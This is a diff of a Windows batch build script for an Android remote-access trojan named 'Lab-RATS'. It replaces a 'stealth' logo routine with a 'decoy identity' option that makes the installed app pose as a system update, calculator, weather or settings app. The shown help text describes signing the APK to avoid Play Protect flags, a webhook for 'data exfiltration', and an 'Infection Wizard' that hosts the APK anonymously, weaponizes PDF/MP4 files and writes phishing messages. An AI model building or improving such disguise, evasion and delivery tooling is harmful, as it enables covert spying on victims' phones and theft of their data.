@@ -17,8 +17,6 @@ REM Get script directory
 set "SCRIPT_DIR=%~dp0"
 set "PROJECT_DIR=%SCRIPT_DIR%.."
 set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"
-set "DEFAULT_LOGO=%PROJECT_DIR%\assets\app_logo.png"
-set "COVERT_LOGO=%PROJECT_DIR%\assets\default_app_icon.png"
 
 goto :main_menu
 
@@ -240,143 +238,6 @@ if %errorlevel% equ 0 (
 )
 goto :eof
 
-:configure_logo
-echo [96m[*] Logo Configuration[0m
-echo.
-
-set "RES_DIR=%PROJECT_DIR%\app\src\main\res"
-
-echo [95m[^>] Logo options:[0m
-echo     1. Use Recommended System-Style Stealth logo (default_app_icon.png)
-echo     2. Use default Lab-RATS logo (app_logo.png)
-echo     3. Use custom logo (provide image path)
-echo     4. Skip (Keep project icons as is)
-echo.
-set /p "LOGO_OPTION=    Choose option (Default 1): "
-if "!LOGO_OPTION!"=="" set "LOGO_OPTION=1"
-
-set "LOGO_PATH="
-
-if "!LOGO_OPTION!"=="1" (
-    if exist "%COVERT_LOGO%" (
-        set "LOGO_PATH=%COVERT_LOGO%"
-        echo [92m[✓] Using System-Style Stealth logo[0m
-    ) else (
-        echo [91m[!] Stealth logo not found at: %COVERT_LOGO%[0m
-        goto :logo_done
-    )
-) else if "!LOGO_OPTION!"=="2" (
-    if exist "%DEFAULT_LOGO%" (
-        set "LOGO_PATH=%DEFAULT_LOGO%"
-        echo [92m[✓] Using default Lab-RATS logo[0m
-    ) else (
-        echo [91m[!] Default logo not found at: %DEFAULT_LOGO%[0m
-        goto :logo_done
-    )
-) else if "!LOGO_OPTION!"=="3" (
-    set /p "CUSTOM_LOGO=    Enter path to logo image (PNG, 512x512): "
-    if exist "!CUSTOM_LOGO!" (
-        set "LOGO_PATH=!CUSTOM_LOGO!"
-    ) else (
-        echo [91m[!] Logo file not found: !CUSTOM_LOGO![0m
-        goto :logo_done
-    )
-) else (
-    echo [92m[✓] No changes made to icons[0m
-    goto :logo_done
-)
-
-if not "!LOGO_PATH!"=="" (
-    echo.
-    set /p "TRANSPARENT=    Make background transparent? (y/N): "
-    
-    echo [96m[*] Processing logo...[0m
-    
-    REM KEY FIX: Remove adaptive icon definitions and any existing launcher icons to prevent duplicates
-    if exist "%RES_DIR%\mipmap-anydpi-v26" (
-        rmdir /s /q "%RES_DIR%\mipmap-anydpi-v26"
-        echo [93m[*] Removed adaptive icon config (forced legacy mode for PNG)[0m
-    )
-
-    REM Remove existing icons to prevent duplicate extension errors (png vs webp)
-    for %%D in (mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi) do (
-        del /f /q "%RES_DIR%\%%D\ic_launcher.png" 2>nul
-        del /f /q "%RES_DIR%\%%D\ic_launcher.webp" 2>nul
-        del /f /q "%RES_DIR%\%%D\ic_launcher_round.png" 2>nul
-        del /f /q "%RES_DIR%\%%D\ic_launcher_round.webp" 2>nul
-        del /f /q "%RES_DIR%\%%D\ic_launcher_foreground.png" 2>nul
-        del /f /q "%RES_DIR%\%%D\ic_launcher_foreground.webp" 2>nul
-    )
-    echo [93m[*] Cleaned up old icon resources[0m
-
-    REM Check for ImageMagick (magick command)
-    where magick >nul 2>nul
-    if %errorlevel% equ 0 (
-        echo [93m[!] Using ImageMagick for resizing...[0m
-        
-        REM Helper function to resize
-        call :resize_logo "!LOGO_PATH!" 48 "%RES_DIR%\mipmap-mdpi"
-        call :resize_logo "!LOGO_PATH!" 72 "%RES_DIR%\mipmap-hdpi"
-        call :resize_logo "!LOGO_PATH!" 96 "%RES_DIR%\mipmap-xhdpi"
-        call :resize_logo "!LOGO_PATH!" 144 "%RES_DIR%\mipmap-xxhdpi"
-        call :resize_logo "!LOGO_PATH!" 192 "%RES_DIR%\mipmap-xxxhdpi"
-        
-        if /i "!TRANSPARENT!"=="y" (
-             echo [96m[*] Applying transparency...[0m
-             call :transparent_logo "%RES_DIR%\mipmap-mdpi"
-             call :transparent_logo "%RES_DIR%\mipmap-hdpi"
-             call :transparent_logo "%RES_DIR%\mipmap-xhdpi"
-             call :transparent_logo "%RES_DIR%\mipmap-xxhdpi"
-             call :transparent_logo "%RES_DIR%\mipmap-xxxhdpi"
-             echo [92m[✓] Transparency applied[0m
-        )
-        echo [92m[✓] Logo resized and copied to all densities[0m
-    ) else (
-        echo [93m[!] ImageMagick not found. Falling back to simple copy.[0m
-        echo [93m    Note: Install ImageMagick to enable resizing and transparency.[0m
-        
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher.png" >nul
-        
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher_round.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher_round.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher_round.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher_round.png" >nul
-        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher_round.png" >nul
-        
-        echo [92m[✓] Logo copied (No resize)[0m
-    )
-)
-
-goto :logo_done
-
-:resize_logo
-if not exist "%~3" mkdir "%~3"
-REM Apply 125% Zoom and Container Fix for Stealth Logo (Option 1)
-if "%LOGO_OPTION%"=="1" (
-    REM 1. Trim edges with fuzz 30% to preserve grey gear
-    REM 2. Set scale to 125% to "Zoom In" (Crop Zoom)
-    REM 3. Force transparency to kill the white box
-    magick convert "%~1" -fuzz 30%% -trim +repage -resize 125%% -background transparent -gravity center -extent %2x%2 "%~3\ic_launcher.png"
-    magick convert "%~1" -fuzz 30%% -trim +repage -resize 125%% -background transparent -gravity center -extent %2x%2 "%~3\ic_launcher_round.png"
-) else (
-    magick convert "%~1" -trim +repage -resize %2x%2 "%~3\ic_launcher.png"
-    magick convert "%~1" -trim +repage -resize %2x%2 "%~3\ic_launcher_round.png"
-)
-goto :eof
-
-:transparent_logo
-magick convert "%~1\ic_launcher.png" -transparent white "%~1\ic_launcher.png"
-magick convert "%~1\ic_launcher_round.png" -transparent white "%~1\ic_launcher_round.png"
-goto :eof
-
-:logo_done
-echo.
-goto :eof
-
 :configure_app
 echo [96m[*] App Configuration[0m
 echo.
@@ -440,6 +301,21 @@ echo APP_NAME="!APP_NAME!"> "%CONFIG_FILE%"
 echo VERSION_NAME="!VERSION_NAME!">> "%CONFIG_FILE%"
 echo MIN_SDK="!MIN_SDK!">> "%CONFIG_FILE%"
 echo PKG_NAME="!PKG_NAME!">> "%CONFIG_FILE%"
+
+echo.
+echo [95m[^>] Decoy Identity Selection[0m
+echo [93m    (The app logo will transform into your selection immediately after install on device)[0m
+echo     1. System Update (Gear)  2. Calculator
+echo     3. Weather               4. Settings
+echo     5. Lab-RATS Logo
+echo.
+set /p "DECOY_CHOICE=    Choice (Default 1): "
+if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"
+
+echo DECOY_CHOICE="!DECOY_CHOICE!">> "%CONFIG_FILE%"
+
+set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
+powershell -Command "if (Test-Path '%LOCAL_PROPS%') { $content = Get-Content '%LOCAL_PROPS%'; if ($content -match 'DECOY_CHOICE=') { $content -replace 'DECOY_CHOICE=.*', 'DECOY_CHOICE=!DECOY_CHOICE!' | Set-Content '%LOCAL_PROPS%' } else { Add-Content '%LOCAL_PROPS%' '`nDECOY_CHOICE=!DECOY_CHOICE!' } } else { Set-Content '%LOCAL_PROPS%' 'DECOY_CHOICE=!DECOY_CHOICE!' }"
 
 REM Google Sheet URL
 echo.
@@ -691,12 +567,11 @@ echo [95m[^>] Build Options:[0m
 echo.
 echo     1. Start Build (Configure & Build)
 echo     2. Generate Keystore Only
-echo     3. Configure Logo Only
-echo     4. Configure App Settings Only
-echo     5. Check/Install Requirements
-echo     6. Generate Infection Chain Package (Wizard)
-echo     7. Help / Documentation
-echo     8. Exit
+echo     3. Configure App Settings Only
+echo     4. Check/Install Requirements
+echo     5. Generate Infection Chain Package (Wizard)
+echo     6. Help / Documentation
+echo     7. Exit
 echo.
 set /p "MENU_OPTION=    Choose option (Default 1): "
 if "!MENU_OPTION!"=="" set "MENU_OPTION=1"
@@ -707,7 +582,6 @@ if "!MENU_OPTION!"=="1" (
     call :check_requirements
     if %errorlevel% neq 0 exit /b 1
     call :generate_keystore
-    call :configure_logo
     call :configure_app
     call :build_apk
 ) else if "!MENU_OPTION!"=="2" (
@@ -715,7 +589,7 @@ if "!MENU_OPTION!"=="1" (
     if %errorlevel% neq 0 exit /b 1
     call :generate_keystore
 ) else if "!MENU_OPTION!"=="3" (
-    call :configure_logo
+    call :configure_app
 ) else if "!MENU_OPTION!"=="4" (
     call :configure_app
 ) else if "!MENU_OPTION!"=="5" (
@@ -754,15 +628,12 @@ echo.
 echo [96m2. Keystore Only:[0m Generates a unique security certificate
 echo    used to sign the APK. Prevents Play Protect flags.
 echo.
-echo [96m3. Logo Only:[0m Injects custom icons into the APK. Use the
-echo    'Stealth' option to hide as a system service.
-echo.
-echo [96m4. App Settings:[0m Change Package ID, App Name, and set
+echo [96m3. App Settings:[0m Change Package ID, App Name, and set
 echo    your Webhook URL for data exfiltration.
 echo.
-echo [96m5. Requirements:[0m Verifies Java/JDK and ImageMagick setup.
+echo [96m4. Requirements:[0m Verifies Java/JDK and ImageMagick setup.
 echo.
-echo [96m6. Infection Wizard:[0m The most powerful tool. It builds your
+echo [96m5. Infection Wizard:[0m The most powerful tool. It builds your
 echo    APK, hosts it anonymously, weaponizes a PDF/MP4 with the
 echo    link, and writes your phishing message. Full-chain auto.
 echo ------------------------------------------------------------
@@ -781,7 +652,6 @@ echo [96m[1/4] Building Stealth APK...[0m
 call :check_requirements
 set "AUTO_KEYSTORE=1"
 call :generate_keystore
-call :configure_logo
 call :configure_app
 call :build_apk
 
